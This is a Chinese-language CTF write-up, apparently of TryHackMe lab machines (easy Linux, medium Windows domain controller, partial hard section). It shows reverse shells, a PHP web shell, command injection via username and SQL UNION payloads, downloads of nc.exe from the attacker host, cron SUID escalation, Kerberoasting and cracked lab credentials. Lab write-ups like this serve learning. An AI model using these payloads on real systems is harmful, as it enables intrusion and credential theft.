# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# Easy Challenge

## 服务发现
```
┌──(root💀kali)-[~/tryhackme/hackerhill]
└─# nmap -sV -Pn 10.10.134.251    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 04:36 EDT
Nmap scan report for 10.10.134.251
Host is up (0.31s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
9999/tcp open  abyss?
```

## 爆破8000端口的目录
```
──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u 10.10.134.251:8000

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 6100

Error Log: /root/dirsearch/logs/errors-21-10-25_04-57-13.log

Target: 10.10.134.251:8000                                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
[04:57:13] Starting: 
[04:57:22] 200 -    2KB - /about                                                 
[04:57:33] 200 -    2KB - /contact                                                                                
[04:57:47] 500 -  613B  - /public_html/robots.txt                                                              
[04:57:47] 200 -   30B  - /robots.txt             
```

```robots.txt```显示有一个cms
```
User-agent: *
Disallow: /vbcms
```

打开是一个登陆页面，尝试用```admin:admin```登陆，居然登陆上了。。。

登陆进去是一个页面编辑界面，可以直接改网页源代码，尝试写php发现可以运行，那就简单了，直接写shell。。。

开启一个端口监听，把shell写进首页，访问，触发反弹
```
┌──(root💀kali)-[~/tryhackme/hackerhill]
└─# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.134.251] 59268
Linux web-serv 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 10:30:53 up  1:08,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(serv1) gid=1000(serv1) groups=1000(serv1),43(utmp)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(serv1) gid=1000(serv1) groups=1000(serv1),43(utmp)
$ whoami
serv1

```

根据提示，第一个flag在```/usr/games/fortune```，去到[这个网站](https://ctf.hacker101.com/ctf/flagcheck)兑换到tryhackme需要的flag

然后第二个，第三个按照指示去到```/var/lib/rary```和```/var/www/serv4/index.php```起上面网站兑换指定flag

## 提权
传linpeas.sh，发现```/home/serv3/backups/backup.sh```这个定时任务是用root身份执行的，频率为一分钟一次

查看bash文件权限
```
serv1@web-serv:/tmp$ ls -alh /home/serv3/backups/backup.sh
ls -alh /home/serv3/backups/backup.sh
-r-xr-xr-x 1 serv3 serv3 52 Feb 15  2021 /home/serv3/backups/backup.sh
```

serv1没有权限编辑这个文件，也就是说我们需要横向提权到serv3？


在```/var/www/html/topSecretPrivescMethod```找到一个secret.txt，看文件夹名字是提权方法，但是打开是一串乱码

在```:8002/lesson/1```这个php运行页面，本来可以直接运行php反弹shell，但是因为页面连接了一个谷歌前端框架，我kali不能翻墙，所以不能运行反弹不了shell

于是研究了下怎么在linux下连v2ray，终于找到了[这篇文章](https://zhuanlan.zhihu.com/p/359755946),按照里面的方法fq成功


回到上面那个页面，写入php反弹shell，拿到serv3的shell

```
┌──(root💀kali)-[~/tryhackme/hackhill]
└─# nc -lnvp 4444                                                        1 ⨯
listening on [any] 4444 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.172.149] 33814
Linux web-serv 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 14:49:20 up  1:13,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1002(serv3) gid=1002(serv3) groups=1002(serv3)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(serv3) gid=1002(serv3) groups=1002(serv3)
```

我们写入下面命令到backup.sh，使得bash命令成为一个SUID
```echo "chmod 4777 /bin/bash" >> /home/serv3/backups/backup.sh```

等待一分钟以后，执行```/bin/bash -p```拿到root权限
```
serv3@web-serv:/$ /bin/bash -p                                                                                                                                                                                                               
/bin/bash -p                                                                                                                                                                                                                                 
bash-4.4# id                                                                                                                                                                                                                                 
id                                                                                                                                                                                                                                           
uid=1002(serv3) gid=1002(serv3) euid=0(root) groups=1002(serv3)                                                                                                                                                                              
bash-4.4# cat /root/root.txt    
```

#  Medium Challenge

## 服务发现

```
┌──(root💀kali)-[~/tryhackme/hackhill]
└─# nmap -sV -Pn 10.10.48.179                                                                                                                                                                                                         130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 10:00 EDT
Nmap scan report for 10.10.48.179
Host is up (0.32s latency).
Not shown: 985 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
81/tcp   open  http          Microsoft IIS httpd 10.0
82/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-25 14:01:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
9999/tcp open  abyss?
```

中等难度是一台windows机器，开了很多服务，一个个查看

80,81,82都是http服务，逐个爆破目录

## 80
```
┌──(root💀kali)-[~/tryhackme/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.48.179

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.48.179/_21-10-25_10-10-52.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-10-52.log

Target: http://10.10.48.179/

[10:10:53] Starting: 
[10:11:00] 200 -    2KB - /%3f/                                            
[10:11:00] 403 -  312B  - /%2e%2e//google.com                              
[10:11:00] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[10:11:09] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[10:11:28] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[10:11:33] 302 -    0B  - /dashboard  ->  /login                            
[10:11:48] 200 -    3KB - /login                                            
[10:11:48] 200 -    3KB - /login/                                           
[10:11:49] 302 -    0B  - /logout/  ->  /                                   
[10:11:49] 302 -    0B  - /logout  ->  /                                    
[10:12:26] 302 -    0B  - /profile  ->  /login                              
[10:12:45] 200 -    3KB - /signup 
```

## 81
```
┌──(root💀kali)-[~/tryhackme/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.48.179:81

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.48.179-81/_21-10-25_10-27-15.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-27-15.log

Target: http://10.10.48.179:81/

[10:27:16] Starting: 
[10:27:22] 200 -    5KB - /%3f/                                            
[10:27:22] 403 -  312B  - /%2e%2e//google.com                              
[10:27:23] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[10:27:31] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[10:27:57] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[10:28:32] 400 -   24B  - /ping     
```

## 82
```
┌──(root💀kali)-[~/tryhackme/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.48.179:82

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
                                                                                                                                                                                                                                             
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.48.179-82/_21-10-25_10-29-15.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-29-15.log

Target: http://10.10.48.179:82/

[10:29:16] Starting: 
[10:29:24] 403 -  312B  - /%2e%2e//google.com                              
[10:29:25] 404 -    1KB - /+CSCOE+/session_password.html                   
[10:29:25] 404 -    1KB - /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
[10:29:25] 404 -    1KB - /+CSCOE+/logon.html#form_title_text              
[10:29:25] 404 -    1KB - /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
[10:29:25] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[10:29:26] 404 -    1KB - /.config/psi+/profiles/default/accounts.xml      
[10:29:41] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[10:30:15] 404 -    1KB - /bitrix/web.config                                
[10:30:17] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[10:30:19] 404 -    1KB - /cms/Web.config                                   
[10:30:30] 404 -    1KB - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[10:30:41] 404 -    1KB - /lang/web.config                                  
[10:30:50] 404 -    1KB - /modules/web.config                               
[10:31:00] 404 -    1KB - /plugins/web.config                               
[10:31:19] 404 -    1KB - /typo3conf/ext/static_info_tables/ext_tables_static+adt-orig.sql
[10:31:19] 404 -    1KB - /typo3conf/ext/static_info_tables/ext_tables_static+adt.sql
[10:31:24] 404 -    1KB - /web.config  
```

80服务运行一个上传服务，但是只能指定```.jpg```文件上传，试了绕不过去
81服务运行了一个ping域名的服务，尝试命令行绕过，貌似不行
82服务没看到啥有用的东西

81端口看url```:81/ping?id=1```，测试了一下，存在sql注入，那么应该这个才是攻击点

## 枚举数据库
```
sqlmap -u "http://10.10.48.179:81/ping?id=1" -p "id"  --batch --dbms=mysql --technique B --dbs
available databases [2]:
[*] information_schema
[*] networkmonitor

```

## 其他信息
>数据表：host 表字段：id,ip
>用户名：monitor_read@localhot
>密码：枚举不出来


## getshell  
这个shell一直打不出来，这里参考大佬的方法
在```http://10.10.48.179/profile```页面，用户名这个字段可以自由修改
而且每次修改完，上传后的路径随即也会被改变
由此可以猜想上传代码可能为：
```
$old_username = 'admin'
$new_username = $GET['username']
system('mv ' . $old_username . ' '. $new_username)
```
因为$old_username这里是用户可以控制的，也就是说可能存在命令行注入漏洞

验证：
在攻击机开启tcpdump监听所有icmp包
```
tcpdump -i tun0 icmp
```

修改用户名payload为：
```admin_test | ping 10.13.21.169```

如果监听能收到ping包，说明我们的命令注入成功

成功收到ping包：
```
┌──(root💀kali)-[~]
└─# tcpdump -i tun0 icmp                                                                                                                                                                                                                 1 ⨯
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:36:08.012297 IP 10.10.48.179 > 10.13.21.169: ICMP echo request, id 1, seq 13, length 40
09:36:08.012335 IP 10.13.21.169 > 10.10.48.179: ICMP echo reply, id 1, seq 13, length 40
09:36:09.008655 IP 10.10.48.179 > 10.13.21.169: ICMP echo request, id 1, seq 14, length 40
09:36:09.008693 IP 10.13.21.169 > 10.10.48.179: ICMP echo reply, id 1, seq 14, length 40
09:36:10.024224 IP 10.10.48.179 > 10.13.21.169: ICMP echo request, id 1, seq 15, length 40
09:36:10.024241 IP 10.13.21.169 > 10.10.48.179: ICMP echo reply, id 1, seq 15, length 40
09:36:11.047680 IP 10.10.48.179 > 10.13.21.169: ICMP echo request, id 1, seq 16, length 40
09:36:11.047696 IP 10.13.21.169 > 10.10.48.179: ICMP echo reply, id 1, seq 16, length 40
```

把nc.exe传到靶机，以便我们反弹shell
```
curl -H "Cookie:token=eyJ1c2VybmFtZSI6ImFkbWluIiwiY29va2llIjoiZWRkYjkzY2UxODY5OTkwZDMyY2Y3ZWMzYTQyYWQxYzgifQ==" -XPOST http://10.10.48.179/profile -d 'username=asd | powershell curl 10.13.21.169:8000/nc.exe -o nc.exe'
```

另起一个窗口监听
``` nc -lnvp 4242 ```

靶机触发payload:
```
admin1 | nc.exe 10.13.21.169 4242 -e powershell
```

收到反弹shell
```
┌──(root💀kali)-[~]
└─# nc -lnvp 4242       
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.48.179] 50099
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\agamemnon\Desktop\WebApp\public> whoami
whoami
troy\agamemnon

```

在```C:\Users\agamemnon\Desktop```拿到用户```agamemnon```的flag


查看一共有多少个用户
```
PS C:\> net users
net users

User accounts for \\TROY-DC

-------------------------------------------------------------------------------
achilles                 Administrator            agamemnon                
Guest                    hector                   helen                    
krbtgt                   patrocles                

```

传winPEASx64.exe枚举，几乎没有什么有用的信息 

## 第二个shell

由于我们之前已经知道81端口存在一个sql注入，观察这个webapp的功能，如果我们能够改变host表ip这个字段的值，那么我们同样也可以利用命令行注入拿到另外一个shell

经过多翻测试，当前账号没有权限插入和修改数据库里的数据

这里使用CONCAT函数把注入命令当做一个字符串拼接到返回的结果当中，因为id=9999查询不到数据，返回的是一个空串，UNION把结果和"|ipconfig"连接在了一起，所以程序最后执行的命令是```ping |ipconfig```

payload如下：
```id=9999 UNION SELECT NULL,CONCAT("|","ipconfig")-- -```
注入用burpsuite时上面的payload要用urlencode加密一下，否则会报400

由于我们现在已经可以注入命令，像前面那个shell一样我们把nc.exe传到靶机，然后再攻击机开启监听，拿到反弹shell

### 传nc.exe
```id=9999 UNION SELECT NULL,CONCAT("|","powershell curl 10.13.21.169:8000/nc.exe -o nc.exe")-- -```

### 本地监听
```nc -lnvp 4444```

### 反弹
```id=9999 UNION SELECT NULL,CONCAT("|","nc.exe 10.13.21.169 4444 -e powershell")-- -```

### 拿shell
```
──(root💀kali)-[~/tryhackme/hackerhill]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.48.179] 52658
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\helen\Desktop\WebApp\h1-tryhackme-medium-two-main\public> ls
PS C:\Users\helen\Desktop\WebApp\h1-tryhackme-medium-two-main\public> whoami
whoami
troy\helen
 
```

在```C:\Users\helen\Desktop```拿到helen的flag

## 第三个shell
82端口这个webapp的getshell非常的trick，以下解法参考了大佬的方法

### 分析
首先这是一个提交框，数据被提交到后台以后，在第二页的源代码注释会出现这样一行文字：
>Ticket saved to ../tickets/

但是无论我们怎么访问，正常情况下都是不能访问tickets这个文件夹的

因为按照之前的经验，所有的webapp其实都是在public下，所以只要我们能够引导这个路径到public下，理论上我们就能在web上访问到tikeit的内容

经过测试Email Address这个字段可以接受双引号，邮箱格式结尾也允许```.php```

因此我们的payload如下：
>Email Address: "../public/"@admin.php*
>Name:      <?php system($_GET['c']); ?\>*
>Message:     <?php system($_GET['c']); ?\>*


上传以后显示：
>saved to ../tickets/../public/@aaa.php 

触发访问：

```http://10.10.48.179:82/@aaa.php?c=whoami```

页面显示whoami命令返回

现在我们得到了一个简单的交互式shell

### 传nc.exe
```http://10.10.48.179:82/@aaa.php?c=powershell curl 10.13.21.169:8000/nc.exe -o nc.exe```


### 本地监听
```nc -lnvp 4445```


### 反弹
```http://10.10.48.179:82/@aaa.php?c=nc.exe 10.13.21.169 4445 -e powershell```


### 拿shell
```
┌──(root💀kali)-[~/tryhackme/hackerhill]
└─# nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.48.179] 49810
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Users\hector\Desktop\WebApp\h1-tryhackme-medium-three-main\public> whoami
whoami
troy\hector
```

在```C:\Users\hector\Desktop```拿到hector的flag

## 提权
把Rubeus.exe传到靶机
```
PS C:\Users\hector\Desktop> powershell curl 10.13.21.169:8000/Rubeus.exe -o Rubeus.exe
powershell curl 10.13.21.169:8000/Rubeus.exe -o Rubeus.exe  
```

dump出用户哈希存到hash.txt
```
PS C:\Users\hector\Desktop> .\Rubeus.exe kerberoast /outfile:dump.txt
.\Rubeus.exe kerberoast /outfile:dump.txt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : troy.thm
[*] Searching path 'LDAP://TROY-DC.troy.thm/DC=troy,DC=thm' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : achilles
[*] DistinguishedName      : CN=Achilles,OU=Created Users,DC=troy,DC=thm
[*] ServicePrincipalName   : TIME/TROY-DC.TROY.THM
[*] PwdLastSet             : 19/02/2021 18:32:09
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\hector\Desktop\dump.txt

[*] Roasted hashes written to : C:\Users\hector\Desktop\dump.txt
```

把dump.txt传回kali，用john破解
```
┌──(root💀kali)-[~/tryhackme/hackerhill]
└─# john dump.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
winniethepooh    (?)
1g 0:00:00:00 DONE (2021-10-28 02:40) 50.00g/s 153600p/s 153600c/s 153600C/s slimshady..dangerous
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

得到achilles的登陆密码

登陆Achilles的账号，发现原来已经是system权限
```
┌──(root💀kali)-[~/windowns-privilege/impacket]
└─# /opt/impacket/build/scripts-3.9/psexec.py TROY.thm/Achilles:winniethepooh@10.10.48.179
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.48.179.....
[*] Found writable share ADMIN$
[*] Uploading file cbyYanQp.exe
[*] Opening SVCManager on 10.10.48.179.....
[*] Creating service CRPo on 10.10.48.179.....
[*] Starting service CRPo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1757]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
因为已经拿到了system权限，至此我们拿到了此靶机的所有flag

# Hard Challenge

服务发现
```
┌──(root💀kali)-[~/tryhackme/hackerhill]
└─# nmap -sV -Pn 10.10.243.173    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-28 04:04 EDT
Nmap scan report for 10.10.243.173
Host is up (0.33s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
81/tcp   open  http    nginx 1.18.0 (Ubuntu)
82/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
8888/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.8.5)
9999/tcp open  abyss?
```

开了两个ssh服务，以及4个http服务，8888那个端口用的是python做的webapp

我们一个个查看。。。

## 81端口
目录爆破
```
┌──(root💀kali)-[~/tryhackme/dirsearch]
└─# python3 dirsearch.py -u http://10.10.243.173:81/ -e* -t 100

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
                                                                                                                                                                                                                                             
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.243.173-81/-_21-10-28_08-54-57.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_08-54-57.log

Target: http://10.10.243.173:81/

[08:54:59] Starting:  
[08:55:40] 200 -  409KB - /access_log                                       
[08:55:52] 301 -  178B  - /images  ->  http://10.10.243.173/images/          
[08:55:52] 403 -  564B  - /images/                                          
                                                                             
Task Completed    
```

/access_log 第一个访问记录暴露一个文件夹```/s3cr3t_area```,打开是一张图片，感觉没啥有用的信息。




## 82端口
目录爆破
```
┌──(root💀kali)-[~/tryhackme/dirsearch]
└─# python3 dirsearch.py -u http://10.10.243.173:82/ -e* -t 100           2 ⨯

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak
HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.243.173-82/-_21-10-28_08-49-12.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_08-49-12.log

Target: http://10.10.243.173:82/

[08:49:13] Starting: 
[08:49:32] 400 -  304B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                                                                                            
[08:50:35] 400 -  304B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                                                                                                                                                                      
[08:50:50] 200 -   21B  - /feed                                                           
[08:50:55] 301 -  316B  - /images  ->  http://10.10.243.173:82/images/                                                  
[08:51:23] 200 -    2KB - /search                                                            
[08:51:31] 301 -    0B  - /t  ->  /t/      
```

在```http://10.10.243.173:82/t/r/y/h/a/r/d/e/r/spamlog.log```找到信息
>Nahamsec made me do it :(

没卵用

一个搜索框，在burpsuite上把搜索请求信息截取出来,保存到data2文件
```
└─# cat data2              
POST /search HTTP/1.1
Host: 10.10.243.173:82
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Origin: http://10.10.243.173:82
Connection: close
Referer: http://10.10.243.173:82/search
Upgrade-Insecure-Requests: 1

q=a

```

sqlmap测试证实存在sql注入，payload为：
sqlmap -r data2 --level=5 --risk=3  --dbms=mysql 

```
  Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=1%' AND 3240=3240 AND 'UEDj%'='UEDj
```

枚举到的信息有：
>数据库：hillpics
>表：hill
>当前用户：'hill'@'localhost'
>密码：无法获取
>当前用户角色和权限： USAGE （最低权限）
>os-shell:无法获取
其余没有什么有用的信息


## 8888端口
爆破目录
```
┌──(root💀kali)-[~/tryhackme/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.243.173:8888

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak
HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.243.173-8888/_21-10-28_09-36-47.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_09-36-47.log

Target: http://10.10.243.173:8888/

[09:36:47] Starting: 
[09:38:05] 200 -  135B  - /apps                                             
[09:39:19] 200 -   45B  - /users                                            
                                                                             
Task Completed
```
/apps打印:
```
{"app1": {"name": "online file storage"}, "app2": {"name": "media player"}, "app3": {"name": "file sync"}, "app4": {"name": "/users"}}

```


/users打印：
```
{"user": {"davelarkin": "totallysecurehuh"}}

```

这里爆出了davelarkin的ssh登录凭证，通过2222端口拿到了flag4
```
┌──(root💀kali)-[~/.ssh]
└─# ssh davelarkin@10.10.243.173 -p 2222                                                                                                                                                                                              255 ⨯
The authenticity of host '[10.10.243.173]:2222 ([10.10.243.173]:2222)' can't be established.
ECDSA key fingerprint is SHA256:D0vPRUo5EfUivVKiJf3i6JIOF50DxmKg/avxmu6bx4o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.243.173]:2222' (ECDSA) to the list of known hosts.
davelarkin@10.10.243.173's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1037-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

davelarkin@a9ef0531077f:~$ whoami
davelarkin
davelarkin@a9ef0531077f:~$ ls
api  bin  container4_flag.txt
davelarkin@a9ef0531077f:~$ cat container4_flag.txt

```

传linpeas发现是在docker内


## 渗透80端口的http服务
目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.243.173                                                                      

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.243.173/_21-10-28_04-15-43.txt

Error Log: /root/dirsearch/logs/errors-21-10-28_04-15-43.log

Target: http://10.10.243.173/

[04:15:44] Starting: 
                                       
[04:16:50] 200 -  136B  - /api                                              
[04:16:50] 200 -  136B  - /api/    
[04:17:27] 200 -    2KB - /login                                            
[04:17:28] 200 -    2KB - /login/                                           
[04:17:29] 302 -    0B  - /logout  ->  /login                               
[04:17:29] 302 -    0B  - /logout/  ->  /login                              
[04:17:52] 302 -    0B  - /shell  ->  /login                                
[04:17:52] 302 -    0B  - /shell/  ->  /login   
```

我们看到至少有三个文件夹，shell这个文件夹应该有有趣的东西，但是重定向到了login
api文件夹可以正常打开，打印了一串json，暴露出来Apache，php,mysql的版本号，数据库名字：servermanager

>{"name":"Server Manager","stack":{"nginx":"Apache\/2.4.41 (Ubuntu)","php":"7.4.3","mysql":{"version":"5.6","database":"servermanager"}}}

login页面源代码显示，如果成功登录，将被导向一个token页面,并且可以携带一个参数
```
<script>
    $('.login').click( function(){

        $.post('/api/user/login',{
            'username'  :   $('input[name="username"]').val(),
            'password'  :   $('input[name="password"]').val()
        },function(resp){
            if( resp.login ){
                window.location = '/token?token=' + resp.token;
            }else{
                alert( resp.error );
            }
        });


    })
</script>
```

看样子像是一个servermanager数据库的登陆页面。不知道用户名

继续对```/api/user```爆破
```
┌──(root💀kali)-[~/tryhackme/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.243.173/api/user

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.243.173/-api-user_21-10-28_09-49-39.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_09-49-39.log

Target: http://10.10.243.173/api/user/

[09:49:41] Starting: 
[09:51:22] 200 -   53B  - /api/user/login                                   
[09:51:22] 200 -   53B  - /api/user/login/                                  
[09:51:44] 200 -   91B  - /api/user/session/                                
[09:51:44] 200 -   91B  - /api/user/session
```

```/api/user/session/```打印

>{"active_sessions":[{"id":1,"username":"admin","hash":"1b4237f476826986da63022a76c35bb1"}]}


貌似可以肯定用户名就是admin
1b4237f476826986da63022a76c35bb1是md5密文,解密以后是：dQw4w9WgXcQ

